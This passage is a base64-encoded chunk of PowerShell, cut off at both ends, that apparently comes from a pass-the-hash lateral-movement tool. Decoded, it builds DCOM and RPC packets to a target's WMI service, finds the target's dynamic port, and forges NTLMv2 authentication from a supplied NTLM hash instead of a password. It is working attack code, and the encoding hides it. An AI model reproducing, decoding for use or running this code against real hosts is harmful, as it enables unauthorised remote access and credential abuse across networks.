gICAgICAgICAgICAgICAgICAgICAgICRhdXRoX2hvc3RuYW1lX2xlbmd0aCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRhdXRoX2hvc3RuYW1lX2xlbmd0aCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRhdXRoX2hvc3RuYW1lX29mZnNldCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRXTUlfc2Vzc2lvbl9rZXlfbGVuZ3RoICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFdNSV9zZXNzaW9uX2tleV9sZW5ndGggKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkV01JX3Nlc3Npb25fa2V5X29mZnNldCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRXTUlfbmVnb3RpYXRlX2ZsYWdzICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGF1dGhfZG9tYWluX2J5dGVzICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGF1dGhfdXNlcm5hbWVfYnl0ZXMgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYXV0aF9ob3N0bmFtZV9ieXRlcyArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROVExNdjJfcmVzcG9uc2UNCg0KICAgICAgICAkYXNzb2NfZ3JvdXAgPSAkV01JX2NsaWVudF9yZWNlaXZlWzIwLi4yM10NCiAgICAgICAgJHBhY2tldF9SUEMgPSBHZXQtUGFja2V0UlBDQVVUSDMgJE5UTE1TU1BfcmVzcG9uc2UNCiAgICAgICAgJFJQQyA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfUlBDDQogICAgICAgICRXTUlfY2xpZW50X3NlbmQgPSAkUlBDDQogICAgICAgICRXTUlfY2xpZW50X3N0cmVhbS5Xcml0ZSgkV01JX2NsaWVudF9zZW5kLDAsJFdNSV9jbGllbnRfc2VuZC5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgJFdNSV9jbGllbnRfc3RyZWFtLkZsdXNoKCkgICAgDQogICAgICAgICRjYXVzYWxpdHlfSUQgPSBbU3RyaW5nXSgxLi4xNiB8IEZvckVhY2gtT2JqZWN0IHsiezA6WDJ9IiAtZiAoR2V0LVJhbmRvbSAtTWluaW11bSAxIC1NYXhpbXVtIDI1NSl9KQ0KICAgICAgICBbQnl0ZVtdXSRjYXVzYWxpdHlfSURfYnl0ZXMgPSAkY2F1c2FsaXR5X0lELlNwbGl0KCIgIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0NCiAgICAgICAgJHVudXNlZF9idWZmZXIgPSBbU3RyaW5nXSgxLi4xNiB8IEZvckVhY2gtT2JqZWN0IHsiezA6WDJ9IiAtZiAoR2V0LVJhbmRvbSAtTWluaW11bSAxIC1NYXhpbXVtIDI1NSl9KQ0KICAgICAgICBbQnl0ZVtdXSR1bnVzZWRfYnVmZmVyX2J5dGVzID0gJHVudXNlZF9idWZmZXIuU3BsaXQoIiAiKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQ0KICAgICAgICAkcGFja2V0X0RDT01fcmVtb3RlX2NyZWF0ZV9pbnN0YW5jZSA9IEdldC1QYWNrZXREQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UgJGNhdXNhbGl0eV9JRF9ieXRlcyAkdGFyZ2V0X3Nob3J0DQogICAgICAgICREQ09NX3JlbW90ZV9jcmVhdGVfaW5zdGFuY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X0RDT01fcmVtb3RlX2NyZWF0ZV9pbnN0YW5jZQ0KICAgICAgICAkcGFja2V0X1JQQyA9IEdldC1QYWNrZXRSUENSZXF1ZXN0IDB4MDMgJERDT01fcmVtb3RlX2NyZWF0ZV9pbnN0YW5jZS5MZW5ndGggMCAwIDB4MDMsMHgwMCwweDAwLDB4MDAgMHgwMSwweDAwIDB4MDQsMHgwMA0KICAgICAgICAkUlBDID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9SUEMNCiAgICAgICAgJFdNSV9jbGllbnRfc2VuZCA9ICRSUEMgKyAkRENPTV9yZW1vdGVfY3JlYXRlX2luc3RhbmNlDQogICAgICAgICRXTUlfY2xpZW50X3N0cmVhbS5Xcml0ZSgkV01JX2NsaWVudF9zZW5kLDAsJFdNSV9jbGllbnRfc2VuZC5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgJFdNSV9jbGllbnRfc3RyZWFtLkZsdXNoKCkgICAgDQogICAgICAgICRXTUlfY2xpZW50X3N0cmVhbS5SZWFkKCRXTUlfY2xpZW50X3JlY2VpdmUsMCwkV01JX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkgPiAkbnVsbA0KDQogICAgICAgIGlmKCRXTUlfY2xpZW50X3JlY2VpdmVbMl0gLWVxIDMgLWFuZCBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRXTUlfY2xpZW50X3JlY2VpdmVbMjQuLjI3XSkgLWVxICcwNS0wMC0wMC0wMCcpDQogICAgICAgIHsNCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiJG91dHB1dF91c2VybmFtZSBXTUkgYWNjZXNzIGRlbmllZCBvbiAkdGFyZ2V0X2xvbmciICAgIA0KICAgICAgICB9DQogICAgICAgIGVsc2VpZigkV01JX2NsaWVudF9yZWNlaXZlWzJdIC1lcSAzKQ0KICAgICAgICB7DQogICAgICAgICAgICAkZXJyb3JfY29kZSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFdNSV9jbGllbnRfcmVjZWl2ZVsyNy4uMjRdKQ0KICAgICAgICAgICAgJGVycm9yX2NvZGUgPSAkZXJyb3JfY29kZSAtcmVwbGFjZSAiLSIsIiINCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiRXJyb3IgY29kZSAweCRlcnJvcl9jb2RlIg0KICAgICAgICB9DQogICAgICAgIGVsc2VpZigkV01JX2NsaWVudF9yZWNlaXZlWzJdIC1lcSAyIC1hbmQgISRXTUlfZXhlY3V0ZSkNCiAgICAgICAgew0KICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICIkb3V0cHV0X3VzZXJuYW1lIGFjY2Vzc2VkIFdNSSBvbiAkdGFyZ2V0X2xvbmciDQogICAgICAgIH0NCiAgICAgICAgZWxzZWlmKCRXTUlfY2xpZW50X3JlY2VpdmVbMl0gLWVxIDIpDQogICAgICAgIHsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiJG91dHB1dF91c2VybmFtZSBhY2Nlc3NlZCBXTUkgb24gJHRhcmdldF9sb25nIg0KDQogICAgICAgICAgICBpZigkdGFyZ2V0X3Nob3J0IC1lcSAnMTI3LjAuMC4xJykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAkdGFyZ2V0X3Nob3J0ID0gJGF1dGhfaG9zdG5hbWUNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgJHRhcmdldF91bmljb2RlID0gMHgwNywweDAwICsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygkdGFyZ2V0X3Nob3J0ICsgIlsiKQ0KICAgICAgICAgICAgJHRhcmdldF9zZWFyY2ggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCR0YXJnZXRfdW5pY29kZSkNCiAgICAgICAgICAgICR0YXJnZXRfc2VhcmNoID0gJHRhcmdldF9zZWFyY2ggLXJlcGxhY2UgIi0iLCIiDQogICAgICAgICAgICAkV01JX21lc3NhZ2UgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRXTUlfY2xpZW50X3JlY2VpdmUpDQogICAgICAgICAgICAkV01JX21lc3NhZ2UgPSAkV01JX21lc3NhZ2UgLXJlcGxhY2UgIi0iLCIiDQogICAgICAgICAgICAkdGFyZ2V0X2luZGV4ID0gJFdNSV9tZXNzYWdlLkluZGV4T2YoJHRhcmdldF9zZWFyY2gpDQoNCiAgICAgICAgICAgIGlmKCR0YXJnZXRfaW5kZXggLWx0IDEpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgJHRhcmdldF9hZGRyZXNzX2xpc3QgPSBbU3lzdGVtLk5ldC5EbnNdOjpHZXRIb3N0RW50cnkoJHRhcmdldF9sb25nKS5BZGRyZXNzTGlzdA0KDQogICAgICAgICAgICAgICAgRm9yRWFjaCgkSVBfYWRkcmVzcyBpbiAkdGFyZ2V0X2FkZHJlc3NfbGlzdCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICR0YXJnZXRfc2hvcnQgPSAkSVBfYWRkcmVzcy5JUEFkZHJlc3NUb1N0cmluZw0KICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X3VuaWNvZGUgPSAweDA3LDB4MDAgKyBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCR0YXJnZXRfc2hvcnQgKyAiWyIpDQogICAgICAgICAgICAgICAgICAgICR0YXJnZXRfc2VhcmNoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkdGFyZ2V0X3VuaWNvZGUpDQogICAgICAgICAgICAgICAgICAgICR0YXJnZXRfc2VhcmNoID0gJHRhcmdldF9zZWFyY2ggLXJlcGxhY2UgIi0iLCIiDQogICAgICAgICAgICAgICAgICAgICR0YXJnZXRfaW5kZXggPSAkV01JX21lc3NhZ2UuSW5kZXhPZigkdGFyZ2V0X3NlYXJjaCkNCg0KICAgICAgICAgICAgICAgICAgICBpZigkdGFyZ2V0X2luZGV4IC1ndCAwKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgaWYoJHRhcmdldF9sb25nIC1jbmUgJHRhcmdldF9zaG9ydCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJVc2luZyAkdGFyZ2V0X3Nob3J0IGZvciByYW5kb20gcG9ydCBleHRyYWN0aW9uIg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBpZigkdGFyZ2V0X2luZGV4IC1ndCAwKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICR0YXJnZXRfYnl0ZXNfaW5kZXggPSAkdGFyZ2V0X2luZGV4IC8gMg0KICAgICAgICAgICAgICAgICRXTUlfcmFuZG9tX3BvcnQgPSAkV01JX2NsaWVudF9yZWNlaXZlWygkdGFyZ2V0X2J5dGVzX2luZGV4ICsgJHRhcmdldF91bmljb2RlLkxlbmd0aCkuLigkdGFyZ2V0X2J5dGVzX2luZGV4ICsgJHRhcmdldF91bmljb2RlLkxlbmd0aCArIDgpXQ0KICAgICAgICAgICAgICAgICRXTUlfcmFuZG9tX3BvcnQgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRXTUlfcmFuZG9tX3BvcnQpDQogICAgICAgICAgICAgICAgJFdNSV9yYW5kb21fcG9ydF9lbmRfaW5kZXggPSAkV01JX3JhbmRvbV9wb3J0LkluZGV4T2YoIi01RCIpDQoNCiAgICAgICAgICAgICAgICBpZigkV01JX3JhbmRvbV9wb3J0X2VuZF9pbmRleCAtZ3QgMCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICRXTUlfcmFuZG9tX3BvcnQgPSAkV01JX3JhbmRvbV9wb3J0LlN1YlN0cmluZygwLCRXTUlfcmFuZG9tX3BvcnRfZW5kX2luZGV4KQ0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICRXTUlfcmFuZG9tX3BvcnQgPSAkV01JX3JhbmRvbV9wb3J0IC1yZXBsYWNlICItMDAiLCIiDQogICAgICAgICAgICAgICAgJFdNSV9yYW5kb21fcG9ydCA9ICRXTUlfcmFuZG9tX3BvcnQuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQ0KICAgICAgICAgICAgICAgIFtJbnRdJFdNSV9yYW5kb21fcG9ydF9pbnQgPSAtam9pbiAkV01JX3JhbmRvbV9wb3J0IA0KICAgICAgICAgICAgICAgICRNRU9XID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkV01JX2NsaWVudF9yZWNlaXZlKQ0KICAgICAgICAgICAgICAgICRNRU9XID0gJE1FT1cgLXJlcGxhY2UgIi0iLCIiDQogICAgICAgICAgICAgICAgJE1FT1dfaW5kZXggPSAkTUVPVy5JbmRleE9mKCI0RDQ1NEY1NzAxMDAwMDAwMThBRDA5RjM2QUQ4RDAxMUEwNzUwMEMwNEZCNjg4MjAiKQ0KICAgICAgICAgICAgICAgICRNRU9XX2J5dGVzX2luZGV4ID0gJE1FT1dfaW5kZXggLyAyDQogICAgICAgICAgICAgICAgJE9YSUQgPSAkV01JX2NsaWVudF9yZWNlaXZlWygkTUVPV19ieXRlc19pbmRleCArIDMyKS4uKCRNRU9XX2J5dGVzX2luZGV4ICsgMzkpXQ0KICAgICAgICAgICAgICAgICRJUElEID0gJFdNSV9jbGllbnRfcmVjZWl2ZVsoJE1FT1dfYnl0ZXNfaW5kZXggKyA0OCkuLigkTUVPV19ieXRlc19pbmRleCArIDYzKV0NCiAgICAgICAgICAgICAgICAkT1hJRCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJE9YSUQpDQogICAgICAgICAgICAgICAgJE9YSUQgPSAkT1hJRCAtcmVwbGFjZSAiLSIsIiINCiAgICAgICAgICAgICAgICAkT1hJRF9pbmRleCA9ICRNRU9XLkluZGV4T2YoJE9YSUQsJE1FT1dfaW5kZXggKyAxMDApDQogICAgICAgICAgICAgICAgJE9YSURfYnl0ZXNfaW5kZXggPSAkT1hJRF9pbmRleCAvIDINCiAgICAgICAgICAgICAgICAkb2JqZWN0X1VVSUQgPSAkV01JX2NsaWVudF9yZWNlaXZlWygkT1hJRF9ieXRlc19pbmRleCArIDEyKS4uKCRPWElEX2J5dGVzX2luZGV4ICsgMjcpXQ0KICAgICAgICAgICAgICAgICRXTUlfY2xpZW50X3JhbmRvbV9wb3J0ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50DQogICAgICAgICAgICAgICAgJFdNSV9jbGllbnRfcmFuZG9tX3BvcnQuQ2xpZW50LlJlY2VpdmVUaW1lb3V0ID0gMzAwMDANCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgaWYoJFdNSV9yYW5kb21fcG9ydCkNCiAgICAgICAgICAgIHsNCg0KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNvbm5lY3RpbmcgdG8gJHRhcmdldF9sb25nYDokV01JX3JhbmRvbV9wb3J0X2ludCINCg0KICAgICAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgJFdNSV9jbGllbnRfcmFuZG9tX3BvcnQuQ29ubmVjdCgkdGFyZ2V0X2xvbmcsJFdNSV9yYW5kb21fcG9ydF9pbnQpDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIiR0YXJnZXRfbG9uZ2A6JFdNSV9yYW5kb21fcG9ydF9pbnQgZGlkIG5vdCByZXNwb25kIg0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiUmFuZG9tIHBvcnQgZXh0cmFjdGlvbiBmYWlsdXJlIg0KICAgICAgICAgICAgfQ0KDQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBXcml0ZS1PdXRwdXQgIlNvbWV0aGluZyB3ZW50IHdyb25nIg0KICAgICAgICB9DQoNCiAgICAgICAgaWYoJFdNSV9jbGllbnRfcmFuZG9tX3BvcnQuQ29ubmVjdGVkKQ0KICAgICAgICB7DQogICAgICAgICAgICAkV01JX2NsaWVudF9yYW5kb21fcG9ydF9zdHJlYW0gPSAkV01JX2NsaWVudF9yYW5kb21fcG9ydC5HZXRTdHJlYW0oKQ0KICAgICAgICAgICAgJHBhY2tldF9SUEMgPSBHZXQtUGFja2V0UlBDQmluZCAyIDB4ZDAsMHgxNiAweDAzIDB4MDAsMHgwMCAweDQzLDB4MDEsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHhjMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQ2IDB4MDAsMHgwMA0KICAgICAgICAgICAgJHBhY2tldF9SUENbIlJQQ0JpbmRfRnJhZ0xlbmd0aCJdID0gMHhkMCwweDAwDQogICAgICAgICAgICAkcGFja2V0X1JQQ1siUlBDQmluZF9BdXRoTGVuZ3RoIl0gPSAweDI4LDB4MDANCiAgICAgICAgICAgICRwYWNrZXRfUlBDWyJSUENCaW5kX0F1dGhMZXZlbCJdID0gMHgwNA0KICAgICAgICAgICAgJHBhY2tldF9SUENbIlJQQ0JpbmRfTmVnb3RpYXRlRmxhZ3MiXSA9IDB4OTcsMHg4MiwweDA4LDB4YTINCiAgICAgICAgICAgICRSUEMgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1JQQw0KICAgICAgICAgICAgJFdNSV9jbGllbnRfc2VuZCA9ICRSUEMNCiAgICAgICAgICAgICRXTUlfY2xpZW50X3JhbmRvbV9wb3J0X3N0cmVhbS5Xcml0ZSgkV01JX2NsaWVudF9zZW5kLDAsJFdNSV9jbGllbnRfc2VuZC5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICRXTUlfY2xpZW50X3JhbmRvbV9wb3J0X3N0cmVhbS5GbHVzaCgpICAgIA0KICAgICAgICAgICAgJFdNSV9jbGllbnRfcmFuZG9tX3BvcnRfc3RyZWFtLlJlYWQoJFdNSV9jbGllbnRfcmVjZWl2ZSwwLCRXTUlfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAkYXNzb2NfZ3JvdXAgPSAkV01JX2NsaWVudF9yZWNlaXZlWzIwLi4yM10NCiAgICAgICAgICAgICRXTUlfTlRMTVNTUCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFdNSV9jbGllbnRfcmVjZWl2ZSkNCiAgICAgICAgICAgICRXTUlfTlRMTVNTUCA9ICRXTUlfTlRMTVNTUCAtcmVwbGFjZSAiLSIsIiINCiAgICAgICAgICAgICRXTUlfTlRMTVNTUF9pbmRleCA9ICRXTUlfTlRMTVNTUC5JbmRleE9mKCI0RTU0NEM0RDUzNTM1MDAwIikNCiAgICAgICAgICAgICRXTUlfTlRMTVNTUF9ieXRlc19pbmRleCA9ICRXTUlfTlRMTVNTUF9pbmRleCAvIDINCiAgICAgICAgICAgICRXTUlfZG9tYWluX2xlbmd0aCA9IERhdGFMZW5ndGgyICgkV01JX05UTE1TU1BfYnl0ZXNfaW5kZXggKyAxMikgJFdNSV9jbGllbnRfcmVjZWl2ZQ0KICAgICAgICAgICAgJFdNSV90YXJnZXRfbGVuZ3RoID0gRGF0YUxlbmd0aDIgKCRXTUlfTlRMTVNTUF9ieXRlc19pbmRleCArIDQwKSAkV01JX2NsaWVudF9yZWNlaXZlDQogICAgICAgICAgICAkV01JX3Nlc3Npb25fSUQgPSAkV01JX2NsaWVudF9yZWNlaXZlWzQ0Li41MV0NCiAgICAgICAgICAgICRXTUlfTlRMTV9jaGFsbGVuZ2UgPSAkV01JX2NsaWVudF9yZWNlaXZlWygkV01JX05UTE1TU1BfYnl0ZXNfaW5kZXggKyAyNCkuLigkV01JX05UTE1TU1BfYnl0ZXNfaW5kZXggKyAzMSldDQogICAgICAgICAgICAkV01JX3RhcmdldF9kZXRhaWxzID0gJFdNSV9jbGllbnRfcmVjZWl2ZVsoJFdNSV9OVExNU1NQX2J5dGVzX2luZGV4ICsgNTYgKyAkV01JX2RvbWFpbl9sZW5ndGgpLi4oJFdNSV9OVExNU1NQX2J5dGVzX2luZGV4ICsgNTUgKyAkV01JX2RvbWFpbl9sZW5ndGggKyAkV01JX3RhcmdldF9sZW5ndGgpXQ0KICAgICAgICAgICAgJFdNSV90YXJnZXRfdGltZV9ieXRlcyA9ICRXTUlfdGFyZ2V0X2RldGFpbHNbKCRXTUlfdGFyZ2V0X2RldGFpbHMuTGVuZ3RoIC0gMTIpLi4oJFdNSV90YXJnZXRfZGV0YWlscy5MZW5ndGggLSA1KV0NCiAgICAgICAgICAgICROVExNX2hhc2hfYnl0ZXMgPSAoJntmb3IgKCRpID0gMDskaSAtbHQgJGhhc2guTGVuZ3RoOyRpICs9IDIpeyRoYXNoLlN1YlN0cmluZygkaSwyKX19KSAtam9pbiAiLSINCiAgICAgICAgICAgICROVExNX2hhc2hfYnl0ZXMgPSAkTlRMTV9oYXNoX2J5dGVzLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0NCiAgICAgICAgICAgICRhdXRoX2hvc3RuYW1lID0gKGdldC1jaGlsZGl0ZW0gLXBhdGggZW52OmNvbXB1dGVybmFtZSkuVmFsdWUNCiAgICAgICAgICAgICRhdXRoX2hvc3RuYW1lX2J5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygkYXV0aF9ob3N0bmFtZSkNCiAgICAgICAgICAgICRhdXRoX2RvbWFpbiA9ICREb21haW4NCiAgICAgICAgICAgICRhdXRoX2RvbWFpbl9ieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoJGF1dGhfZG9tYWluKQ0KICAgICAgICAgICAgJGF1dGhfdXNlcm5hbWVfYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCR1c2VybmFtZSkNCiAgICAgICAgICAgICRhdXRoX2RvbWFpbl9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRhdXRoX2RvbWFpbl9ieXRlcy5MZW5ndGgpDQogICAgICAgICAgICAkYXV0aF9kb21haW5fbGVuZ3RoID0gJGF1dGhfZG9tYWluX2xlbmd0aFswLDFdDQogICAgICAgICAgICAkYXV0aF9kb21haW5fbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkYXV0aF9kb21haW5fYnl0ZXMuTGVuZ3RoKQ0KICAgICAgICAgICAgJGF1dGhfZG9tYWluX2xlbmd0aCA9ICRhdXRoX2RvbWFpbl9sZW5ndGhbMCwxXQ0KICAgICAgICAgICAgJGF1dGhfdXNlcm5hbWVfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkYXV0aF91c2VybmFtZV9ieXRlcy5MZW5ndGgpDQogICAgICAgICAgICAkYXV0aF91c2VybmFtZV9sZW5ndGggPSAkYXV0aF91c2VybmFtZV9sZW5ndGhbMCwxXQ0KICAgICAgICAgICAgJGF1dGhfaG9zdG5hbWVfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkYXV0aF9ob3N0bmFtZV9ieXRlcy5MZW5ndGgpDQogICAgICAgICAgICAkYXV0aF9ob3N0bmFtZV9sZW5ndGggPSAkYXV0aF9ob3N0bmFtZV9sZW5ndGhbMCwxXQ0KICAgICAgICAgICAgJGF1dGhfZG9tYWluX29mZnNldCA9IDB4NDAsMHgwMCwweDAwLDB4MDANCiAgICAgICAgICAgICRhdXRoX3VzZXJuYW1lX29mZnNldCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJGF1dGhfZG9tYWluX2J5dGVzLkxlbmd0aCArIDY0KQ0KICAgICAgICAgICAgJGF1dGhfaG9zdG5hbWVfb2Zmc2V0ID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkYXV0aF9kb21haW5fYnl0ZXMuTGVuZ3RoICsgJGF1dGhfdXNlcm5hbWVfYnl0ZXMuTGVuZ3RoICsgNjQpDQogICAgICAgICAgICAkYXV0aF9MTV9vZmZzZXQgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRhdXRoX2RvbWFpbl9ieXRlcy5MZW5ndGggKyAkYXV0aF91c2VybmFtZV9ieXRlcy5MZW5ndGggKyAkYXV0aF9ob3N0bmFtZV9ieXRlcy5MZW5ndGggKyA2NCkNCiAgICAgICAgICAgICRhdXRoX05UTE1fb2Zmc2V0ID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkYXV0aF9kb21haW5fYnl0ZXMuTGVuZ3RoICsgJGF1dGhfdXNlcm5hbWVfYnl0ZXMuTGVuZ3RoICsgJGF1dGhfaG9zdG5hbWVfYnl0ZXMuTGVuZ3RoICsgODgpDQogICAgICAgICAgICAkSE1BQ19NRDUgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuSE1BQ01ENQ0KICAgICAgICAgICAgJEhNQUNfTUQ1LmtleSA9ICROVExNX2hhc2hfYnl0ZXMNCiAgICAgICAgICAgICR1c2VybmFtZV9hbmRfdGFyZ2V0ID0gJHVzZXJuYW1lLlRvVXBwZXIoKQ0KICAgICAgICAgICAgJHVzZXJuYW1lX2FuZF90YXJnZXRfYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCR1c2VybmFtZV9hbmRfdGFyZ2V0KQ0KICAgICAgICAgICAgJHVzZXJuYW1lX2FuZF90YXJnZXRfYnl0ZXMgKz0gJGF1dGhfZG9tYWluX2J5dGVzDQogICAgICAgICAgICAkTlRMTXYyX2hhc2ggPSAkSE1BQ19NRDUuQ29tcHV0ZUhhc2goJHVzZXJuYW1lX2FuZF90YXJnZXRfYnl0ZXMpDQogICAgICAgICAgICAkY2xpZW50X2NoYWxsZW5nZSA9IFtTdHJpbmddKDEuLjggfCBGb3JFYWNoLU9iamVjdCB7InswOlgyfSIgLWYgKEdldC1SYW5kb20gLU1pbmltdW0gMSAtTWF4aW11bSAyNTUpfSkNCiAgICAgICAgICAgICRjbGllbnRfY2hhbGxlbmdlX2J5dGVzID0gJGNsaWVudF9jaGFsbGVuZ2UuU3BsaXQoIiAiKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQ0KDQogICAgICAgICAgICAkc2VjdXJpdHlfYmxvYl9ieXRlcyA9IDB4MDEsMHgwMSwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRXTUlfdGFyZ2V0X3RpbWVfYnl0ZXMgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNsaWVudF9jaGFsbGVuZ2VfYnl0ZXMgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkV01JX3RhcmdldF9kZXRhaWxzICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwDQoNCiAgICAgICAgICAgICRzZXJ2ZXJfY2hhbGxlbmdlX2FuZF9zZWN1cml0eV9ibG9iX2J5dGVzID0gJFdNSV9OVExNX2NoYWxsZW5nZSArICRzZWN1cml0eV9ibG9iX2J5dGVzDQogICAgICAgICAgICAkSE1BQ19NRDUua2V5ID0gJE5UTE12Ml9oYXNoDQogICAgICAgICAgICAkTlRMTXYyX3Jlc3BvbnNlID0gJEhNQUNfTUQ1LkNvbXB1dGVIYXNoKCRzZXJ2ZXJfY